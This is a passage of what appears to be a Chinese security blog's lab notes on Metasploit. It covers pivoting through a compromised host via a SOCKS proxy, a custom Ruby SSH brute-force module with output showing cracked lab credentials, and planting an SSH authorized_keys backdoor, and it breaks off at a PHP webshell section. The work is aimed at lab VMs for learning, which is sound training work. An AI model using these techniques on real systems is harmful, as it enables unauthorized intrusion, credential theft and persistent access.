class="line">per host)</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ftp/ftp_test) &gt; <span class="built_in">set</span> rhosts 10.10.10.129</span><br><span class="line">rhosts =&gt; 10.10.10.129 msf6 auxiliary(scanner /ftp/ftp_test) &gt;run</span><br><span class="line"></span><br><span class="line">[*] 10.10.10.129:21 - 10.10.10.129 is running 220 (vsFTPd 2.2.2)</span><br><span class="line"></span><br><span class="line">[*] 10.10.10.129:21 - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">msf6 auxiliary(scanner/ftp/ftp_test) &gt;services</span><br><span class="line">Services</span><br><span class="line">========</span><br><span class="line"></span><br><span class="line">host port proto name state info</span><br><span class="line">---- ---- ----- ---- ----- ----</span><br><span class="line">10.10.10.129 21 tcp ftp open 220 (vsFTPd 2.2.2)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>精通Metasploit渗透测试 第2版</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>跳板攻击实验</title>
    <url>/2021/11/23/%E8%B7%B3%E6%9D%BF%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<h2 id="跳板攻击">1. 跳板攻击</h2>
<p>跳板攻击指的是攻击者将已经被成功渗透的计算机作为跳板来攻击别的计算机。假设有一个被限制访问的Web服务器。这个服务器的安全措施设定了只有Alice的计算机可以访问。这种情况将需要首先渗透并控制Alice的计算机，然后利用它去连接限制访问的目标Web服务器。这意味着以Alice的计算机作为跳板，将我们发出的所有攻击流量通过Alice的计算机转发给目标Web服务器。如下图：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123172442084-1425443113.png" /></p>
<h2 id="实验环境">2. 实验环境</h2>
<ul>
<li><strong>Mallory：Kali Linux（10.10.10.128）</strong></li>
<li><strong>Alice：Metasploitable_ubuntu(做网关用的靶机)（10.10.10.254）</strong></li>
<li><strong>Charlie：owasp 0.94 （10.10.10.129）</strong></li>
</ul>
<h2 id="实验步骤">3. 实验步骤</h2>
<h3 id="渗透控制-alice">1、渗透控制 Alice</h3>
<p>渗透进入Alice的计算机，并且取得目标系统的Meterpreter命令行控制权限，以ssh爆破为例，先利用
ssh 服务弱口令拿到 Alice 的shell，再利用backdoor.elf 获取 meterpreter
命令行</p>
<p><strong>具体实验可参见：</strong><a
href="https://www.cnblogs.com/z9m8r8/articles/15414343.html"
class="uri">https://www.cnblogs.com/z9m8r8/articles/15414343.html</a></p>
<h3 id="添加动态路由">2、添加动态路由</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; route <span class="built_in">print</span> </span><br><span class="line">    [*] There are currently no routes defined.</span><br><span class="line">   msf6&gt;sessions </span><br><span class="line">    </span><br><span class="line">    Active sessions</span><br><span class="line">    ===============</span><br><span class="line">    </span><br><span class="line">      Id            Name      Type                  Information            Connection</span><br><span class="line">      --            ----      ----                  -----------            ----------</span><br><span class="line">      1         meterpreter x86/linux        　　root @ metasploitable  10.10.10.128:4444 - &gt; 10.10.10.254:56205　　　　　　<span class="comment">#已控制的 Alice</span></span><br><span class="line">                　　                           (uid=0, gid=0, euid=0, egid=0)   </span><br><span class="line">　　　　　　　　　　　　　　　　　　　　　　　　　　　　@ metasploitable.localdo...</span><br><span class="line">    </span><br><span class="line">    msf6&gt; route add 10.10.10.0/24 1</span><br><span class="line">    [*] Route added</span><br><span class="line">    msf6&gt; route <span class="built_in">print</span></span><br><span class="line">    </span><br><span class="line">    IPv4 Active Routing Table</span><br><span class="line">    =========================</span><br><span class="line">    </span><br><span class="line">       Subnet             Netmask            Gateway</span><br><span class="line">       ------             -------            -------</span><br><span class="line">      10.10.10.0         255.255.255.0      Session 1</span><br><span class="line">    </span><br><span class="line">    [*] There are currently no IPv6 routes defined.</span><br></pre></td></tr></table></figure>
<h3 id="建立代理服务器">3、建立代理服务器</h3>
<p>建立一个代理服务器将所有的请求通过Meterpreter会话传给目标Web服务器，以auxiliary/server/socks_proxy
为例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/server/socks_proxy</span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt;show options</span><br><span class="line">Module options (auxiliary/server/socks_proxy):</span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">---- --------------- -------- -----------</span><br><span class="line">PASSWORD no Proxy password <span class="keyword">for</span> SOCKS5 listener</span><br><span class="line">SRVHOST 0.0.0.0 <span class="built_in">yes</span> The address to listen on</span><br><span class="line">SRVPORT 1080 <span class="built_in">yes</span> The port to listen on</span><br><span class="line">USERNAME no Proxy username <span class="keyword">for</span> SOCKS5 listener</span><br><span class="line">VERSION 5 <span class="built_in">yes</span> The SOCKS version to use (Accepted: 4a</span><br><span class="line">, 5)</span><br><span class="line">Auxiliary action:</span><br><span class="line">Name Description</span><br><span class="line">---- -----------</span><br><span class="line">Proxy Run a SOCKS proxy server</span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; <span class="built_in">set</span> SRVHOST 127.0.0.1</span><br><span class="line">SRVHOST =&gt; 127.0.0.1 msf6 auxiliary(server /socks_proxy) &gt;run</span><br><span class="line">[*] Auxiliary module running as background job 0.</span><br></pre></td></tr></table></figure>
<h3 id="使用代理联网以firefox为例">4、使用代理联网（以Firefox为例）</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123173657897-2099188796.png" /></p>
<h3 id="访问目标服务器">5、访问目标服务器</h3>
<p><strong>（1）添加路由后的实验情况</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123173817632-716617938.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123173824498-370679575.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123173830868-183671200.png" /></p>
<p><strong>（2）移除路由后的实验情况</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; route remove 10.10.10.0/24 1</span><br><span class="line">[*] Route removed</span><br><span class="line">msf6 &gt; route</span><br><span class="line">[*] There are currently no routes defined.</span><br><span class="line">msf6 &gt;</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123173850804-2013218295.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123173859057-2146274335.png" /></p>
<h2 id="总结回顾">4. 总结回顾</h2>
<ul>
<li><strong>首先渗透Alice的计算机。</strong></li>
<li><strong>接着通过在Alice的计算机上安装的Meterpreter添加了一条到Charlie的限制访问服务器的路由项。</strong></li>
<li><strong>然后建立了一个socks代理服务器，以实现将所有的网络数据流量都自动地通过Meterpreter发送到Alice的计算机上。</strong></li>
<li><strong>根据新建立的socks代理服务器地址重新配置了系统的代理设置文件。</strong></li>
<li><strong>将浏览器的代理地址设置为socks的地址。</strong></li>
<li><strong>最终我们以被渗透的Alice的计算机IP地址来访问目标Web服务器。
</strong>不管我们对Web服务器做了什么操作，在Web服务器眼中这一切都是Alice的计算机做的。**
然而，我们的真实IP却是10.10.10.128**</li>
</ul>
]]></content>
      <categories>
        <category>精通Metasploit渗透测试 第2版</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>自定义的 SSH 认证暴力破解模块</title>
    <url>/2021/11/21/%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9A%84%20SSH%20%E8%AE%A4%E8%AF%81%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%A8%A1%E5%9D%97/</url>
    <content><![CDATA[<h2 id="代码实现">1. 代码实现</h2>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;msf/core&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;metasploit/framework/login_scanner/ssh&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;metasploit/framework/credential_collection&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MetasploitModule</span> &lt; <span class="title class_ inherited__">Msf::Auxiliary</span></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Auxiliary::AuthBrute</span></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Auxiliary::Report</span></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Auxiliary::Scanner</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">initialize</span></span><br><span class="line">    <span class="variable language_">super</span>(</span><br><span class="line">      <span class="string">&#x27;Name&#x27;</span> =&gt; <span class="string">&#x27;ssh login test&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Description&#x27;</span> =&gt; <span class="string">%q&#123;</span></span><br><span class="line"><span class="string">        My Module.</span></span><br><span class="line"><span class="string">      &#125;</span>,</span><br><span class="line">      <span class="string">&#x27;Author&#x27;</span> =&gt; <span class="string">&#x27;z9m8r8&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;License&#x27;</span> =&gt; <span class="variable constant_">MSF_LICENSE</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    register_options(</span><br><span class="line">      [</span><br><span class="line">        <span class="title class_">Opt</span><span class="symbol">:</span><span class="symbol">:RPORT</span>(<span class="number">22</span>)</span><br><span class="line">      ],</span><br><span class="line">      <span class="variable language_">self</span>.<span class="keyword">class</span></span><br><span class="line">    )</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">run_host</span>(<span class="params">ip</span>)</span><br><span class="line">    cred_collection = <span class="title class_">Metasploit::Framework::CredentialCollection</span>.new(</span><br><span class="line">      <span class="symbol">blank_passwords:</span> datastore[<span class="string">&#x27;BLANK_PASSWORDS&#x27;</span>],</span><br><span class="line">      <span class="symbol">pass_file:</span> datastore[<span class="string">&#x27;PASS_FILE&#x27;</span>],</span><br><span class="line">      <span class="symbol">password:</span> datastore[<span class="string">&#x27;PASSWORD&#x27;</span>],</span><br><span class="line">      <span class="symbol">user_file:</span> datastore[<span class="string">&#x27;USER_FILE&#x27;</span>],</span><br><span class="line">      <span class="symbol">userpass_file:</span> datastore[<span class="string">&#x27;USERPASS_FILE&#x27;</span>],</span><br><span class="line">      <span class="symbol">username:</span> datastore[<span class="string">&#x27;USERNAME&#x27;</span>],</span><br><span class="line">      <span class="symbol">user_as_pass:</span> datastore[<span class="string">&#x27;USER_AS_PASS&#x27;</span>],</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    scanner=<span class="title class_">Metasploit::Framework::LoginScanner::SSH</span>.new(</span><br><span class="line">      <span class="symbol">host:</span>ip,</span><br><span class="line">      <span class="symbol">port:</span>datastore[<span class="string">&#x27;RPORT&#x27;</span>],</span><br><span class="line">      <span class="symbol">cred_details:</span> cred_collection,</span><br><span class="line">      <span class="symbol">proxies:</span> datastore[<span class="string">&#x27;Proxies&#x27;</span>],</span><br><span class="line">      <span class="symbol">stop_on_success:</span> datastore[<span class="string">&#x27;STOP_ON_SUCCESS&#x27;</span>],</span><br><span class="line">      <span class="symbol">bruteforce_speed:</span> datastore[<span class="string">&#x27;BRUTEFORCE_SPEED&#x27;</span>],</span><br><span class="line">      <span class="symbol">connection_timeout:</span> datastore[<span class="string">&#x27;SSH_TIMEOUT&#x27;</span>],</span><br><span class="line">      <span class="symbol">framework:</span> framework,</span><br><span class="line">      <span class="symbol">framework_module:</span> <span class="variable language_">self</span>,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    scanner.scan! <span class="keyword">do</span> |<span class="params">result</span>|</span><br><span class="line">      credential_data = result.to_h</span><br><span class="line">      credential_data.merge!(</span><br><span class="line">        <span class="symbol">module_fullname:</span> <span class="variable language_">self</span>.fullname,</span><br><span class="line">        <span class="symbol">workspace_id:</span> myworkspace_id</span><br><span class="line">      )</span><br><span class="line">      <span class="keyword">if</span> result.success?</span><br><span class="line">        credential_core = create_credential(credential_data)</span><br><span class="line">        credential_data[<span class="symbol">:core</span>] = credential_core</span><br><span class="line">        create_credential_login(credential_data)</span><br><span class="line">        print_good <span class="string">&quot;<span class="subst">#&#123;ip&#125;</span> - LOGIN SUCCESSFUL: <span class="subst">#&#123;result.credential&#125;</span>&quot;</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        invalidate_login(credential_data)</span><br><span class="line">        print_status <span class="string">&quot;<span class="subst">#&#123;ip&#125;</span> - LOGIN FAILED: <span class="subst">#&#123;result.credential&#125;</span>(<span class="subst">#&#123;result.status&#125;</span>: <span class="subst">#&#123;result.proof&#125;</span>)&quot;</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<h2 id="代码解析">2. 代码解析</h2>
<h3 id="库文件介绍">1、库文件介绍</h3>
<ul>
<li>Msf::Auxiliary::AuthBrute
存在于/lib/msf/core/auxiliary/auth_brute.rb中，提供了必要的暴力破解机制和功能，例如提供了单独的登录用户名和密码表、生词表、空密码等选项</li>
<li>msf/core库文件包含了core库的路径</li>
<li>metasploit/framework/login_scanner/ssh包含了SSH登录扫描库，利用这个库可以避免所有的手动操作，它还提供了SSH扫描的基础API。</li>
<li>metasploit/framework/credential_collection帮助我们通过使用datastore中的用户输入，创建复合的登录凭证。</li>
</ul>
<h3 id="函数介绍">2、函数介绍</h3>
<p><strong>initialize函数定义基本信息</strong></p>
<p><strong>cred_collection和scanner对象</strong></p>
<ul>
<li>其中的cred_collection对象会基于用户的输入产生登录凭证，
scanner对象会使用这些登录凭证去扫描目标</li>
</ul>
<p><strong>CredentialCollection类</strong></p>
<ul>
<li>cred_collection仅仅实现了按照数据存储选项来设置登录凭证。</li>
<li>所有的登录扫描模块都需要使用credential对象完成登录操作</li>
<li>CredentialCollection类的优势在于，它既可以在一次扫描中同时执行单一的用户名/密码组合、生词本、空白密码等操作，也可以一次只执行一种操作</li>
</ul>
<p><strong>.scanner</strong></p>
<ul>
<li>完成对一个SSH类对象的初始化</li>
<li>对象中存储了目标的地址、端口
、使用CredentialCollection类产生的登录凭证和其他信息，包括代理信息、
stop_on_success的值（如果为真，扫描将会在获取到正确的登录凭证之后停止）、暴力破解的速度以及登录超时的值</li>
</ul>
<p><strong>.scan</strong></p>
<ul>
<li>使用.scan可以实现扫描的初始化，它将完成所有的登录尝试----这表示我们无须指定其他机制。
.scan指令就相当于Ruby中的each循环语句</li>
<li>create_credential()：存于/lib/msf/core/auxiliary/report.rb中，从result对象中得到登录凭证数据</li>
<li>create_credential_login()
：存于/lib/msf/core/auxiliary/report.rb中，从result对象中创建登录凭证，利用这个凭证可以登录特定的服务</li>
<li>invalidate_login：存于/lib/msf/core/auxiliary/report.rb中，用来标记一些对目标服务无效的登录凭证</li>
<li>credential_data =
result.to_h：to_h方法对这个结果进行处理后分配给变量credential_data。
to_h方法的作用是将数据转换成哈希格式。</li>
<li><strong>将模块的名字和工作区 id合并到
credential_data变量中</strong></li>
</ul>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">credential_data.merge!(</span><br><span class="line">　　<span class="symbol">module_fullname:</span> <span class="variable language_">self</span>.fullname,</span><br><span class="line">　　<span class="symbol">workspace_id:</span> myworkspace_id</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>使用
result对象的.success变量作为判断条件，这个变量表示对目标的登录是否成功。如果result.success?的值为true，就认为这个登录凭证是正确的，并将其保存到数据库中；不过如果这个条件不满足要求，就将这个登录数据变量传递给invalidate_login方法，表示这次登录失败了</strong></li>
</ul>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> result.success?</span><br><span class="line">　　credential_core = create_credential(credential_data)</span><br><span class="line">　　credential_data[<span class="symbol">:core</span>] = credential_core</span><br><span class="line">　　create_credential_login(credential_data)</span><br><span class="line">　　print_good <span class="string">&quot;<span class="subst">#&#123;ip&#125;</span> - LOGIN SUCCESSFUL: <span class="subst">#&#123;result.credential&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">　　invalidate_login(credential_data)</span><br><span class="line">　　print_status <span class="string">&quot;<span class="subst">#&#123;ip&#125;</span> - LOGIN FAILED: <span class="subst">#&#123;result.credential&#125;</span>(<span class="subst">#&#123;result.status&#125;</span>: <span class="subst">#&#123;result.proof&#125;</span>)&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<h3 id="保存位置">3、保存位置</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211121213655284-1729881761.png" /></p>
<h3 id="调试检查语法错误">4、调试检查语法错误</h3>
<p><strong>本应使用 </strong>msftidy调式检查，**
由于实践时个人实验机的msftidy总出错，故是直接通过msfconsole加载失败查看日志改正的**</p>
<p><strong>msfconsole 能加载成功但run时报错</strong></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(scanner/ssh/ssh_login_test) &gt; run</span><br><span class="line"></span><br><span class="line">[-] <span class="title class_">Auxiliary</span> <span class="symbol">failed:</span> <span class="title class_">ArgumentError</span> wrong number of arguments (given <span class="number">1</span>, expected <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">[-] <span class="title class_">Call</span> <span class="symbol">stack:</span></span><br><span class="line"></span><br><span class="line">[-] /usr/share/metasploit-framework/modules/auxiliary/scanner/ssh/ssh_login_test.<span class="symbol">rb:</span><span class="number">43</span><span class="symbol">:in</span> <span class="string">`run_host&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[-] /usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:121:in `</span>block (<span class="number">2</span> levels) <span class="keyword">in</span> run<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[-] /usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:105:in `block in spawn&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] <span class="title class_">Auxiliary</span> <span class="keyword">module</span> execution completed</span><br></pre></td></tr></table></figure>
<p><strong>根据提示到43行检查所得 port:datastore('RPORT'), 该语句中的 []
写成了 () ,改回 [] 即可</strong></p>
<h2 id="msf-中运行测试"><strong>3. msf 中运行测试</strong></h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/ssh/ssh_login_test </span><br><span class="line">    msf6 auxiliary(scanner/ssh/ssh_login_test) &gt; <span class="built_in">set</span> rhosts 10.10.10.129</span><br><span class="line">    rhosts =&gt; 10.10.10.129 msf6 auxiliary(scanner /ssh/ssh_login_test) &gt; <span class="built_in">set</span> threads 10</span><br><span class="line">    threads =&gt; 10 msf6 auxiliary(scanner /ssh/ssh_login_test) &gt; <span class="built_in">set</span> pass_file <span class="string">&quot;/home/z9m8r8/test/user_pass.txt&quot;</span></span><br><span class="line">    pass_file =&gt; /home/z9m8r8/test/user_pass.txt</span><br><span class="line">    msf6 auxiliary(scanner/ssh/ssh_login_test) &gt; <span class="built_in">set</span> user_file <span class="string">&quot;/home/z9m8r8/test/user_pass.txt&quot;</span></span><br><span class="line">    user_file =&gt; /home/z9m8r8/test/user_pass.txt</span><br><span class="line">    msf6 auxiliary(scanner/ssh/ssh_login_test) &gt;run</span><br><span class="line">    </span><br><span class="line">    [!] No active DB -- Credential data will not be saved!</span><br><span class="line">    [*] 10.10.10.129 - LOGIN FAILED: admin:admin(Incorrect: )</span><br><span class="line">    [*] 10.10.10.129 - LOGIN FAILED: admin:roor(Incorrect: )</span><br><span class="line">    …………</span><br><span class="line">    [*] 10.10.10.129 - LOGIN FAILED: root:ubuntu(Incorrect: )</span><br><span class="line">    [+] 10.10.10.129 -LOGIN SUCCESSFUL: root:owaspbwa</span><br><span class="line">    [*] 10.10.10.129 - LOGIN FAILED: toor:admin(Incorrect: )</span><br><span class="line">    [*] 10.10.10.129 - LOGIN FAILED: toor:roor(Incorrect: )</span><br><span class="line">    [*] 10.10.10.129 - LOGIN FAILED: user:ubuntu(Incorrect: )</span><br><span class="line">    [+] 10.10.10.129 -LOGIN SUCCESSFUL: user:owaspbwa</span><br><span class="line">    [*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">    [*] Auxiliary module execution completed</span><br><span class="line">   msf6 auxiliary(scanner/ssh/ssh_login_test) &gt;creds </span><br><span class="line">    Credentials</span><br><span class="line">    ===========</span><br><span class="line">    </span><br><span class="line">    host          origin        service       public  private   realm  private_type  JtR Format</span><br><span class="line">    ----          ------        -------       ------  -------   -----  ------------  ----------</span><br><span class="line">    10.10.10.129  10.10.10.129  22/tcp (ssh)  user    owaspbwa         Password      </span><br><span class="line">    10.10.10.129  10.10.10.129  22/tcp (ssh)  root    owaspbwa         Password      </span><br><span class="line">    </span><br><span class="line">    msf6 auxiliary(scanner/ssh/ssh_login_test) &gt; </span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>精通Metasploit渗透测试 第2版</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>远程控制和后门部署</title>
    <url>/2022/10/17/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E5%92%8C%E5%90%8E%E9%97%A8%E9%83%A8%E7%BD%B2/</url>
    <content><![CDATA[<h1
id="linux系统的ssh免认证后门"><strong>Linux系统的SSH免认证后门</strong></h1>
<h2 id="基本原理"><strong>1. 基本原理</strong></h2>
<h3
id="linux系统的ssh免认证后门原理"><strong>1、Linux系统的SSH免认证后门原理</strong></h3>
<p>免密码登录的原理就是在S一端存放那些有访问权限的C端的身份认证。即，在C端以ssh-gen命令生成一对公/私钥，私钥放在C端，公钥上传到S端。这样，每次从C登录S的时候，C端凭借着私钥让服务器端认证自己。这个密码只在C端把公钥上传到S端的时候用一次，后续登录即可免认证。</p>
<h3
id="linux系统的ssh免认证后门危害"><strong>2、Linux系统的SSH免认证后门危害</strong></h3>
<p>利用SSH免认证后门就可以不输入任何用户名和密码的信息，从而实现了免认证的
SSH。即使管理员日后修改了密码，也能够随时登录获取 root 用户权限。</p>
<h3
id="linux系统的ssh免认证后门防范"><strong>3、Linux系统的SSH免认证后门防范</strong></h3>
<ul>
<li>重装openssh软件，更新至最新版本</li>
<li>更换ssh默认端口</li>
<li>在iptable中添加ssh访问策略</li>
<li>查看命令历史纪录，对可疑文件进行清理。在有条件的情况下，可重做系统</li>
<li>修改服务器所有用户的密码为新的强壮密码。</li>
</ul>
<h2 id="实验环境"><strong>2. 实验环境</strong></h2>
<ul>
<li>操作机：Windows</li>
<li>目标机：Ubuntu</li>
<li>实验工具：Putty</li>
</ul>
<p>PuTTY是一个Telnet、SSH、rlogin、纯TCP以及串行接口连接软件。较早的版本仅支持Windows平台，在最近的版本中开始支持各类Unix平台，并打算移植至Mac
OS
X上。除了官方版本外，有许多第三方的团体或个人将PuTTY移植到其他平台上，像是以Symbian为基础的移动电话。PuTTY为一开放源代码软件，主要由Simon
Tatham维护，使用MIT
licence授权。随着Linux在服务器端应用的普及，Linux系统管理越来越依赖于远程。在各种远程登录工具中，Putty是出色的工具之一。Putty是一个免费的、Windows
x86平台下的Telnet、SSH和rlogin客户端，但是功能丝毫不逊色于商业的Telnet类工具。</p>
<h2 id="实验过程"><strong>3. 实验过程</strong></h2>
<h3
id="利用puttygen生成密钥"><strong>1、利用PuttyGen生成密钥</strong></h3>
<p>点击“Genterate”按钮来生成一对非对称的公私密钥。在生成密钥的时候，需要等待一段时间，不过可以在空白处随意快速移动鼠标来加快生成速度。默认采用“SSH-2
RSA”算法以及“2048bit”密钥长度，一般无需改动。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634cc80aad371.png" /></p>
<ul>
<li><strong>结果</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634cc847e2aed.png" /></p>
<ul>
<li><strong>点击“Save private key”按钮来保存私钥</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634cc8a2b6445.png" /></p>
<ul>
<li><strong>将公钥字符串复制出来，也单独保存个文本文件【后续要用】</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634cc97b67843.png" /></p>
<h3
id="目标机authorized_keys配置公钥"><strong>2、目标机【authorized_keys】配置公钥</strong></h3>
<ul>
<li><strong>利用Putty工具，登录到目标机中，并将创建的公钥字符串追加添加到“/root/.ssh/authorized_keys”文件中去</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634cc9e49028a.png" /></p>
<ul>
<li><strong>确认系统中是否已经存在“/root/.ssh/authorized_keys”这个文件以及“/root/.ssh/”这个隐藏目录。</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -a /root/.ssh/authorized_keys</span><br><span class="line"><span class="built_in">ls</span> -ad /root/.ssh</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">*   **如果系统默认不存在该目录和文件，先运行以下命令来创建目录和文件**。</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634cca6e2e2a1.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```bash  </span><br><span class="line"><span class="built_in">mkdir</span> /root/.ssh</span><br><span class="line"><span class="built_in">touch</span> /root/.ssh/authorized_keys</span><br><span class="line"><span class="built_in">ls</span> -al /root/.ssh/authorized_keys</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634cca8c7f67a.png)</span><br><span class="line"></span><br><span class="line">*   **运行以下命令来将刚才创建的公钥字符串追加添加到“/root/.ssh/authorized\_keys”文件中。**</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```bash  </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAAB…………………………O3I0Q== rsa-key-20221017&quot;</span> &gt;&gt; /root/.ssh/authorized_keys<span class="string">&quot; &gt;&gt; /root/.ssh/authorized_keys</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>使用以下命令查看文件内容，确认是否正确：</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634ccb7a14bb1.png" /></p>
<ul>
<li><strong>退出 Putty 的本次 SSH 会话。</strong></li>
</ul>
<h3
id="利用putty进行免认证的-ssh-登录测试"><strong>3、利用Putty进行免认证的
SSH 登录测试</strong></h3>
<ul>
<li><strong>先进行以下图片所示的基本配置</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634ccc14463a2.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634ccc265cbfc.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634ccc44a43c9.png" /></p>
<ul>
<li><strong>结果</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634ccc529a9f7.png" /></p>
<h1
id="linux系统的php-webshell后门"><strong>Linux系统的PHP-Webshell后门</strong></h1>
<h2 id="基本原理-1"><strong>1. 基本原理</strong></h2>
<h3 id="linux系统的php-webshell后门利用原理"><strong>1、Linux系统的PHP
Webshell后门利用原理</strong></h3>
<p>利用ftp上传小马文件，通过菜刀链接，得到文件管理权限，上传大马文件后，提权就可以直接得到WEBSHELL，危害等级超级高，现在的入侵中上传漏洞也是常见的漏洞。导致该漏洞的原因在于代码作者没有对一些共享服务进行有效的管理，可以直接上传危害文件，从而导致主机被攻陷。</p>
<h3 id="linux系统的php-webshell后门利用危害"><strong>2、Linux系统的PHP
Webshell后门利用危害</strong></h3>
<p>拿到了网站的WebShell，就可以修改网站的文件了！这样，网站将不再有秘密可言，比如下载文件，修改文件，删除文件等，将变得非常容易。拿到WebShell权限后，如果磁盘做了安全设置以及站点独立权限设置，则这个WebShell可能只能对当前站点有效，无法操作其他网站的程序。如果入侵者通过执行命令，提升网站的权限后，就可以发展到入侵服务器，进而创建管理用户，达到控制整台服务器的目的。</p>
<h3 id="linux系统的php-webshell后门利用防范"><strong>3、Linux系统的PHP
Webshell后门利用防范</strong></h3>
<p>当前最有效的解决办法，就是用软件查杀/入侵防护系统，快速对网站文件进行扫描，找出隐藏深处的网页木马并处理。
